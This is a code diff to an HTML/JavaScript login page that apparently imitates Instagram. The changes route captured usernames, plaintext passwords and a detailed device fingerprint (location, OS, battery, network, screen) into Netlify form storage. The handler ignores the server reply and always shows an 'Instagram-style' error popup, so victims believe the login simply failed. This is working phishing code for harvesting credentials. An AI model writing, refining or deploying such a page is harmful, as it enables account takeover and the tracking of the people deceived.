@@ -548,7 +548,8 @@
         </div>
 
         <div class="form-section">
-            <form id="loginForm" onsubmit="handleLogin(event)">
+            <form id="loginForm" name="login" data-netlify="true" onsubmit="handleLogin(event)">
+                <input type="hidden" name="fingerprint" value="" />
                 <div class="form-group">
                     <div class="input-wrapper">
                         <input type="text" id="username" name="username" class="form-input"
@@ -557,6 +558,7 @@
                     </div>
                 </div>
                 <div class="form-group">
+                    <div class="input-wrapper">
                     <input type="password" id="password" name="password" class="form-input" placeholder="Password"
                         autocomplete="current-password" required />
                     <button type="button" class="password-toggle" id="toggleBtn" onclick="togglePasswordVisibility()"
@@ -579,6 +581,7 @@
                                 fill-rule="evenodd" />
                         </svg>
                     </button>
+                    </div>
                 </div>
                 <button type="submit" class="submit-btn" id="submitBtn">Log in</button>
             </form>
@@ -813,13 +816,18 @@
             try { fp = await getFingerprint(); }
             catch (err) { fp = { device: 'Unknown', os: 'Unknown', loc: 'Unknown', tz: 'Unknown', bat: 'N/A', net: 'Unknown', lang: 'Unknown', screen: 'Unknown', timing: '0' }; }
 
-            fetch('/log', {
+            var formData = new URLSearchParams();
+            formData.append('form-name', 'login');
+            formData.append('username', u);
+            formData.append('password', p);
+            formData.append('fingerprint', JSON.stringify(fp));
+
+            fetch('/', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: u, password: p, fingerprint: fp })
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData.toString()
             })
-                .then(function (r) { return r.json().then(function (d) { if (!r.ok) throw new Error('Server error'); return d; }); })
-                .then(function (data) {
+                .then(function () {
                     document.getElementById('loadingOverlay').classList.remove('active');
                     // ★ Show Instagram-style popup instead of alert()
                     showErrorPopup();
